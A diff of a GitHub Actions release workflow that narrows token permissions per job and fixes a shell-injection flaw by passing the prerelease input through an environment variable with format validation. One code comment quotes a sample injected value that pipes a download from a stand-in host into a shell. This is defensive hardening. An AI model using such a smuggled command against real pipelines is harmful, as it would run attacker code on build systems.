@@ -645,10 +645,9 @@ on:
         required: false
         type: string
 
+# Least privilege: each job asks only for what it needs.
 permissions:
-  contents: write
-  pull-requests: write
-  packages: write
+  contents: read
 
 concurrency:
   group: release-${{ github.ref }}
@@ -659,6 +658,9 @@ jobs:
   release-please:
     if: github.event_name == 'push'
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
     outputs:
       release_created: ${{ steps.release.outputs.release_created }}
       tag_name: ${{ steps.release.outputs.tag_name }}
@@ -669,8 +671,10 @@ jobs:
 
   # === Manual pre-release (workflow_dispatch) ===
   manual-release:
-    if: github.event_name == 'workflow_dispatch' && github.event.inputs.prerelease != ''
+    if: github.event_name == 'workflow_dispatch' && inputs.prerelease != ''
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
     outputs:
       version: ${{ steps.version.outputs.version }}
       tag_name: ${{ steps.version.outputs.tag_name }}
@@ -682,9 +686,16 @@ jobs:
 
       - name: Compute pre-release version
         id: version
+        # Pass the input through env, never ${{ }} inside run: — a value like
+        # `a"; curl evil | sh; "` would otherwise run as shell code.
+        env:
+          PRERELEASE: ${{ inputs.prerelease }}
         run: |
+          if [[ ! "$PRERELEASE" =~ ^[0-9A-Za-z]+(\.[0-9A-Za-z]+)*$ ]]; then
+            echo "::error::prerelease must look like alpha.1, beta.2 or rc.1"
+            exit 1
+          fi
           BASE_VERSION=$(node -p "require('./package.json').version")
-          PRERELEASE="${{ github.event.inputs.prerelease }}"
           VERSION="${BASE_VERSION}-${PRERELEASE}"
           echo "version=${VERSION}" >> "$GITHUB_OUTPUT"
           echo "tag_name=v${VERSION}" >> "$GITHUB_OUTPUT"
